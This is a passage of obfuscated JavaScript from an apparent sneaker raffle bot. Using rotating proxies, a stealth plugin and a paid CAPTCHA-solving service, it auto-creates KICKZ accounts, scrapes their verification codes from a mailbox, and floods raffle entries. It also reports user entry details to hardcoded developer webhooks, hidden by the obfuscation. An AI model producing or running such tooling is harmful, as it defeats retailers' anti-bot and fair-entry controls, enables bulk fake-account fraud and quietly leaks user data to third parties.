                        var _0x11d5bb = _0x73a12c[_0x420b88]['split'](':');
                    else
                        var _0x31af5c = Math['round'](Math['random']() * (_0x73a12c['length'] - 0x1)), _0x11d5bb = _0x73a12c[_0x31af5c]['split'](':');
                    const _0x179075 = await _0x4e5975['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x11d5bb[0x0] + ':' + _0x11d5bb[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x9ce26f = await _0x179075['newPage']();
                        await _0x9ce26f['authenticate']({
                            'username': '' + _0x11d5bb[0x2],
                            'password': '' + _0x11d5bb[0x3]
                        }), console['log'](_0x207f7e() + '\x20[' + _0x3cd25b['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9ce26f['setRequestInterception'](!![]), _0x9ce26f['on']('request', _0x2f7b90 => {
                            _0x2f7b90['resourceType']() === 'image' || _0x2f7b90['resourceType']() === 'font' || _0x2f7b90['resourceType']() === 'media' ? _0x2f7b90['abort']() : _0x2f7b90['continue']();
                        }), await _0x9ce26f['goto']('' + _0x3bd90d[_0x420b88]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x9ce26f['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x207f7e() + '\x20[' + _0x3cd25b['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x9ce26f['type']('#comp_firstname', '' + _0x3bd90d[_0x420b88]['FirstName']), await _0x9ce26f['waitForSelector']('#comp_lastname'), await _0x9ce26f['type']('#comp_lastname', '' + _0x3bd90d[_0x420b88]['LastName']), await _0x9ce26f['waitForSelector']('#comp_email'), await _0x9ce26f['type']('#comp_email', '' + _0x3bd90d[_0x420b88]['Email']), await _0x9ce26f['waitForSelector']('#comp_paypalemail'), await _0x9ce26f['type']('#comp_paypalemail', '' + _0x3bd90d[_0x420b88]['Email']), await _0x9ce26f['waitForSelector']('#comp_mobile_end'), await _0x9ce26f['type']('#comp_mobile_end', '' + _0x3bd90d[_0x420b88]['Phone']), await _0x9ce26f['waitForSelector']('#comp_dob'), await _0x9ce26f['type']('#comp_dob', '08/09/1992'), console['log'](_0x207f7e() + '\x20[' + _0x3cd25b['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x3bd90d[_0x420b88]['Size'] == 'RANDOM') {
                            const _0x41fbba = await _0x9ce26f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xf78167 => {
                                return _0xf78167['map'](_0x1c2fa6 => _0x1c2fa6['value']);
                            });
                            var _0x5b1723 = Math['round'](Math['random']() * (_0x41fbba['length'] - 0x2));
                            await _0x9ce26f['select']('#shoesize', _0x41fbba[_0x5b1723 + 0x1]), await _0x2bc7d2(0x3e8);
                        } else {
                            const _0x2801c7 = await _0x9ce26f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4d8853 => {
                                return _0x4d8853['map'](_0x5eb579 => _0x5eb579['innerText']);
                            }), _0x50b167 = await _0x9ce26f['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2e47ce => {
                                return _0x2e47ce['map'](_0x37058a => _0x37058a['value']);
                            });
                            var _0x224739 = _0x3bd90d[_0x420b88]['Size'];
                            for (var _0x1ddd2e = 0x1; _0x1ddd2e < _0x50b167['length']; _0x1ddd2e++) {
                                var _0x539f0d = _0x2801c7[_0x1ddd2e]['split']('\x20')[0x0];
                                if (_0x539f0d == _0x224739) {
                                    await _0x9ce26f['select']('#shoesize', _0x50b167[_0x1ddd2e]);
                                    break;
                                } else {
                                    if (_0x1ddd2e + 0x1 == _0x50b167['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x9ce26f['waitForSelector']('#comp_address1'), await _0x9ce26f['type']('#comp_address1', _0x3bd90d[_0x420b88]['Address1'] + '\x20' + _0x3bd90d[_0x420b88]['HouseNumber']), await _0x9ce26f['waitForSelector']('#comp_address2'), await _0x9ce26f['type']('#comp_address2', '' + _0x3bd90d[_0x420b88]['Address2']), await _0x9ce26f['waitForSelector']('#comp_address2'), await _0x9ce26f['type']('#comp_address3', '' + _0x3bd90d[_0x420b88]['City']), await _0x9ce26f['waitForSelector']('#comp_postcode'), await _0x9ce26f['type']('#comp_postcode', '' + _0x3bd90d[_0x420b88]['Zip']), console['log'](_0x207f7e() + '\x20[' + _0x3cd25b['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2bc7d2(0x4b0), await _0x9ce26f['click']('label#emailhold'), await _0x2bc7d2(0x5dc), await _0x9ce26f['click']('#preauth_tandc_email\x20>\x20label'), await _0x2bc7d2(0x5dc), await _0x9ce26f['click']('#submit'), await _0x9ce26f['waitForSelector']('#paymentWrap'), console['log'](_0x207f7e() + '\x20[' + _0x3cd25b['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20' + _0x49dcd4['blue']('Awaiting\x20Paypal\x20Payment')), _0x179075['on']('targetcreated', async _0x5f261b => {
                            if (_0x5f261b['type']() === 'page') {
                                const _0x30c04d = await _0x5f261b['page']();
                                async function _0x2ef57d() {
                                    try {
                                        await _0x9ce26f['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x293e93 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x2109a0() {
                                    try {
                                        await _0x9ce26f['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x33186c = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x2109a0(), _0x2ef57d(), await _0x2bc7d2(0x493e0);
                            }
                        });
                        async function _0x2f8847() {
                            for (let _0x542406 = 0x0; _0x542406 < 0x12c; _0x542406++) {
                                if (_0x33186c == !![]) {
                                    _0x25898d = 'no', _0x1560d5(_0x3bd90d[_0x420b88], _0x3cd25b), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x3cd25b['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                                        try {
                                            await _0x5e696c(_0x397a11['webhook'], _0x3c154d['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x3c154d['succesDEVMSG']), await _0x2bc7d2(0xc8);
                                    try {
                                        await _0x5e696c(_0x3ebea8, _0x3c154d['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x293e93)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x2bc7d2(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x2bc7d2(0xbb8), await _0x9ce26f['click']('.zoid-outlet'), await _0x2bc7d2(0x7d0), await _0x2f8847();
                    } catch (_0x3d4b8f) {
                        console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3cd25b['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20' + _0x3d4b8f)), _0x4c7309 = '' + _0x3d4b8f;
                        var _0x79984b = await _0x1487ea(_0x3bd90d[_0x420b88], _0x3cd25b, 'dev', !![], _0x4c7309);
                        _0x3c154d['errorDEV'] = { 'embeds': [_0x79984b] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x3c154d['errorDEV']), await _0x5e696c(_0x8997ff, _0x3c154d['errorDEV']);
                    } finally {
                        _0x179075 && _0x179075['close']();
                        if (_0x25898d == 'yes' && _0xf7857f != 0x5 && _0x4c7309 != 'Size\x20Not\x20Found') {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x3cd25b['name'] + ']\x20Task\x20' + (_0x420b88 + 0x1) + '\x20:\x20Retrying')), _0x420b88 = _0x420b88 - 0x1, _0xf7857f = _0xf7857f + 0x1;
                            continue;
                        }
                        _0x25898d == 'yes' && _0xf7857f >= 0x5 && (_0x4b302f(afew[_0x420b88], _0x3cd25b), _0x25898d = 'no', _0xf7857f = 0x0), console['log']('Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x5ed02c, _0x13740d, _0x1a9008) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2eda56 = 0x0; _0x2eda56 < _0x13740d['length']; _0x2eda56++) {
                        const _0x3cb30c = 'https://www.kickz.com/login';
                        if (_0x4d2b48 != 'yes')
                            var _0x4d2b48 = '', _0x26cb77 = 0x0;
                        _0x535b9c(_0x5ed02c['name'] + '\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20/\x20' + _0x13740d['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x13740d, _0x2eda56);
                        var _0x8647ab = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3b1bf1
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x397a11['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x14595d
                                }
                            ]
                        }];
                        const _0x57822c = { 'embeds': _0x8647ab };
                        var _0x45323f = await _0x1487ea(_0x13740d[_0x2eda56], _0x5ed02c, 'acc', ![]);
                        const _0xac2107 = { 'succesDEVMSG': { 'embeds': [_0x45323f] } };
                        if (_0x13740d[_0x2eda56]['Email'] == '' || _0x13740d[_0x2eda56]['FirstName'] == '' || _0x13740d[_0x2eda56]['LastName'] == '') {
                            console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x13740d[_0x2eda56]['Password'] == '' && (_0x13740d[_0x2eda56]['Password'] = 'JRaffles23!');
                        if (_0x397a11['useRandomProxy'] = ![])
                            var _0x2abc21 = _0x1a9008[_0x2eda56]['split'](':');
                        else
                            var _0xa3a310 = Math['round'](Math['random']() * (_0x1a9008['length'] - 0x1)), _0x2abc21 = _0x1a9008[_0xa3a310]['split'](':');
                        const _0x2315e2 = await _0x4e5975['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2abc21[0x0] + ':' + _0x2abc21[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x38ddb8 = await _0x2315e2['newPage']();
                            await _0x38ddb8['authenticate']({
                                'username': '' + _0x2abc21[0x2],
                                'password': '' + _0x2abc21[0x3]
                            }), console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x38ddb8['setRequestInterception'](!![]), _0x38ddb8['on']('request', _0x4f90b8 => {
                                _0x4f90b8['resourceType']() === 'image' || _0x4f90b8['resourceType']() === 'font' || _0x4f90b8['resourceType']() === 'media' ? _0x4f90b8['abort']() : _0x4f90b8['continue']();
                            }), await _0x38ddb8['goto'](_0x3cb30c), await _0x2bc7d2(0xbb8), console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x38ddb8['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x38ddb8['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x38ddb8['waitForSelector']('#button-register'), await _0x2bc7d2(0x7d0), await _0x38ddb8['evaluate'](() => {
                                const _0x4a2e16 = document['querySelector']('#button-register');
                                _0x4a2e16['click']();
                            }), console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2bc7d2(0x1388), await _0x38ddb8['waitForSelector']('#customer_salutation'), await _0x38ddb8['select']('#customer_salutation', 'mr'), await _0x2bc7d2(0x7d0), await _0x38ddb8['waitForSelector']('#customer_firstname'), await _0x38ddb8['type']('#customer_firstname', '' + _0x13740d[_0x2eda56]['FirstName']), await _0x2bc7d2(0x352), await _0x38ddb8['waitForSelector']('#customer_lastname'), await _0x38ddb8['type']('#customer_lastname', '' + _0x13740d[_0x2eda56]['LastName']), await _0x2bc7d2(0x352), await _0x38ddb8['type']('#email-input', '' + _0x13740d[_0x2eda56]['Email']), await _0x2bc7d2(0x352), await _0x38ddb8['type']('#email-confirm-input', '' + _0x13740d[_0x2eda56]['Email']), await _0x2bc7d2(0x352), await _0x38ddb8['type']('#register-password', '' + _0x13740d[_0x2eda56]['Password']), await _0x2bc7d2(0x352), await _0x38ddb8['type']('#password-confirm', '' + _0x13740d[_0x2eda56]['Password']), await _0x2bc7d2(0x352), console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x38ddb8['click']('#consent'), await _0x2bc7d2(0x1f4);
                            const _0x46c383 = await _0x38ddb8['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x46c383) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x38ddb8['click']('#buttonRegister');
                            try {
                                await _0x38ddb8['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x13740d[_0x2eda56]['Email']), await _0x2bc7d2(0x4b0);
                            async function _0x250180() {
                                var _0x5b11bb, _0x551731 = ![];
                                for (var _0x16324f = 0x0; _0x16324f < 0x18; _0x16324f++) {
                                    async function _0x5c0280() {
                                        var _0x595ad0 = new _0x91ddb5({
                                            'user': _0x397a11['masterMail'],
                                            'password': _0x397a11['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x2b75d3(_0x43da5a) {
                                            _0x595ad0['openBox']('INBOX', ![], _0x43da5a);
                                        }
                                        _0x595ad0['once']('ready', function () {
                                            console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x2b75d3(function (_0x567f4b, _0x2a32e2) {
                                                console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x567f4b)
                                                    throw _0x567f4b;
                                                _0x595ad0['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x13286c, _0x3c4307) {
                                                    if (!_0x3c4307 || !_0x3c4307['length'])
                                                        console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x595ad0['end']();
                                                    else {
                                                        var _0x5308b2 = _0x595ad0['seq']['fetch'](_0x3c4307, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5308b2['on']('message', function (_0x16b5a7, _0x25c0c4) {
                                                            var _0x46b841 = '(#' + _0x25c0c4 + ')\x20';
                                                            _0x16b5a7['on']('body', function (_0x3aac4b, _0x43db9d) {
                                                                _0x3631ef(_0x3aac4b, (_0x2becd4, _0x2e1fa6) => {
                                                                    if (_0x2e1fa6['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x2297c0 = _0x2e1fa6['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x41a61f = _0x2297c0[0x1]['split']('<')[0x0];
                                                                        _0x5b11bb = _0x41a61f;
                                                                    }
                                                                });
                                                            }), _0x16b5a7['once']('end', function () {
                                                            });
                                                        }), _0x5308b2['once']('error', function (_0x1218ef) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5308b2['once']('end', function () {
                                                            _0x595ad0['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x595ad0['once']('error', function (_0x538c73) {
                                            console['log'](_0x49dcd4['red'](_0x538c73['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x551731 = !![];
                                        }), _0x595ad0['once']('end', async function () {
                                        }), _0x595ad0['connect']();
                                    }
                                    _0x5c0280(), await _0x2bc7d2(0x1388);
                                    if (_0x5b11bb)
                                        return _0x5b11bb;
                                    if (_0x551731)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x16324f == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x250180(), _0x2bc7d2(0x320), console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Verifying..'), await _0x38ddb8['type']('#verificationCode', code), await _0x2bc7d2(0x1f4), await _0x38ddb8['click']('#buttonVerify'), await _0x2bc7d2(0x190), await _0x38ddb8['click']('#buttonVerify'), await _0x2bc7d2(0x3e8);
                            try {
                                await _0x38ddb8['waitForSelector']('div.b-user_greeting'), _0x4d2b48 = 'no', console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Account\x20' + _0x13740d[_0x2eda56]['Email'] + '\x20Generated\x20&\x20Verified!')), _0xd8dc96['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x13740d[_0x2eda56]['Email'] + ',' + _0x13740d[_0x2eda56]['Password'] + ','), console['log'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Account\x20' + _0x13740d[_0x2eda56]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0xac2107['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5e696c(_0x29936e, _0xac2107['succesDEVMSG']);
                            } catch {
                                _0x4d2b48 = 'no', console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x534667) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20' + _0x534667)), _0x8647ab[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x8647ab[0x0]['description'] = '' + _0x534667, await _0x5e696c(_0x8997ff, _0x57822c), _0x4d2b48 = 'yes';
                        } finally {
                            _0x2315e2 && _0x2315e2['close']();
                            if (_0x4d2b48 == 'yes' && _0x26cb77 != 0x5) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5ed02c['name'] + ']\x20Task\x20' + (_0x2eda56 + 0x1) + '\x20:\x20Retrying')), _0x2eda56 = _0x2eda56 - 0x1, _0x26cb77 = _0x26cb77 + 0x1;
                                continue;
                            }
                            _0x4d2b48 == 'yes' && _0x26cb77 >= 0x5 && (_0x4b302f(_0x13740d[_0x2eda56], _0x5ed02c), _0x4d2b48 = 'no', _0x26cb77 = 0x0), console['log']('Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x575f8a, _0x1aa7ab, _0x2ed557) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3f4e1b = 0x0; _0x3f4e1b < _0x1aa7ab['length']; _0x3f4e1b++) {
                        var _0x2ec93e;
                        if (_0x463ec8 != 'yes')
                            var _0x463ec8 = '', _0x555729 = 0x0;
                        _0x535b9c(_0x575f8a['name'] + '\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20/\x20' + _0x1aa7ab['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d);
                        var _0x30d56c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3b1bf1
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x1aa7ab[_0x3f4e1b]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x1aa7ab[_0x3f4e1b]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x397a11['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x14595d
                                }
                            ]
                        }], _0x1b5f46 = await _0x1487ea(_0x1aa7ab[_0x3f4e1b], _0x575f8a, 'dev', ![]), _0x32d0fc = await _0x1487ea(_0x1aa7ab[_0x3f4e1b], _0x575f8a, 'pub', ![]);
                        const _0x44b051 = {
                            'succesDEVMSG': { 'embeds': [_0x1b5f46] },
                            'succesPUBMSG': { 'embeds': [_0x32d0fc] }
                        };
                        await _0x38eff1(_0x1aa7ab, _0x3f4e1b);
                        if (_0x1aa7ab[_0x3f4e1b]['Email'] == '' || _0x1aa7ab[_0x3f4e1b]['Password'] == '' || _0x1aa7ab[_0x3f4e1b]['FirstName'] == '' || _0x1aa7ab[_0x3f4e1b]['LastName'] == '') {
                            console['log'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x397a11['useRandomProxy'] = ![])
                            var _0x5baf21 = _0x2ed557[_0x3f4e1b]['split'](':');
                        else
                            var _0xd27730 = Math['round'](Math['random']() * (_0x2ed557['length'] - 0x1)), _0x5baf21 = _0x2ed557[_0xd27730]['split'](':');
                        const _0x5d45c0 = await _0x4e5975['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x5baf21[0x0] + ':' + _0x5baf21[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x42b239 = await _0x5d45c0['newPage']();
                            await _0x42b239['authenticate']({
                                'username': '' + _0x5baf21[0x2],
                                'password': '' + _0x5baf21[0x3]
                            }), console['log'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x42b239['setRequestInterception'](!![]), _0x42b239['on']('request', _0x2dabd3 => {
                                _0x2dabd3['resourceType']() === 'image' || _0x2dabd3['resourceType']() === 'font' || _0x2dabd3['resourceType']() === 'media' ? _0x2dabd3['abort']() : _0x2dabd3['continue']();
                            }), await _0x42b239['goto']('' + _0x1aa7ab[_0x3f4e1b]['Url'], { 'waitUntil': 'networkidle2' }), await _0x2bc7d2(0x12c);
                            try {
                                await _0x42b239['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x42b239['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Logging\x20in'), await _0x42b239['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x42b239['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x42b239['waitForSelector']('#username'), await _0x42b239['type']('#username', _0x1aa7ab[_0x3f4e1b]['Email']), await _0x42b239['waitForSelector']('#password'), await _0x42b239['type']('#password', _0x1aa7ab[_0x3f4e1b]['Password']), await _0x2bc7d2(0x190), await _0x42b239['click']('#buttonSubmit'), await _0x42b239['waitForSelector']('div.b-user_greeting'), console['log'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Getting\x20Product'), await _0x2bc7d2(0x1f4), await _0x42b239['goto']('' + _0x1aa7ab[_0x3f4e1b]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x1aa7ab[_0x3f4e1b]['Size']);
                            let _0x4c42b9 = _0x1aa7ab[_0x3f4e1b]['Size']['replace']('.5', '\x201/2');
                            await _0x42b239['click']('button[title=\x22' + _0x4c42b9 + '\x22]'), await _0x2bc7d2(0x1f4);
                            try {
                                await _0x42b239['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x2bc7d2(0x12c), console['log'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x42b239['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x2bc7d2(0x12c), await _0x42b239['type']('#dwfrm_raffle_addressFields_firstName', _0x1aa7ab[_0x3f4e1b]['FirstName']), await _0x2bc7d2(0x12c), await _0x42b239['type']('#dwfrm_raffle_addressFields_lastName', _0x1aa7ab[_0x3f4e1b]['LastName']), await _0x2bc7d2(0x12c), await _0x42b239['select']('#dwfrm_raffle_addressFields_country', _0x1aa7ab[_0x3f4e1b]['Country']), await _0x2bc7d2(0x12c), await _0x42b239['type']('#dwfrm_raffle_addressFields_city', _0x1aa7ab[_0x3f4e1b]['City']), await _0x2bc7d2(0x12c);
                            _0x1aa7ab[_0x3f4e1b]['Postcode'] == undefined && (_0x1aa7ab[_0x3f4e1b]['Postcode'] = _0x1aa7ab[_0x3f4e1b]['Zip']);
                            await _0x42b239['type']('#dwfrm_raffle_addressFields_postalCode', _0x1aa7ab[_0x3f4e1b]['Postcode']), await _0x2bc7d2(0x12c), await _0x42b239['type']('#dwfrm_raffle_addressFields_address1', _0x1aa7ab[_0x3f4e1b]['Address1']), await _0x2bc7d2(0x12c), await _0x42b239['type']('#dwfrm_raffle_addressFields_address2', _0x1aa7ab[_0x3f4e1b]['HouseNumber']), await _0x2bc7d2(0x12c), await _0x42b239['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x1aa7ab[_0x3f4e1b]['Address2']), await _0x2bc7d2(0x12c), await _0x42b239['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x2bc7d2(0x12c), await _0x42b239['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x1aa7ab[_0x3f4e1b]['Follower']), await _0x2bc7d2(0x1f4), await _0x42b239['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x2bc7d2(0x1f4), console['log'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20' + _0x49dcd4['blue']('Awaiting\x20Paypal\x20Payment')), await _0x42b239['click']('.b-paypal_button');
                            try {
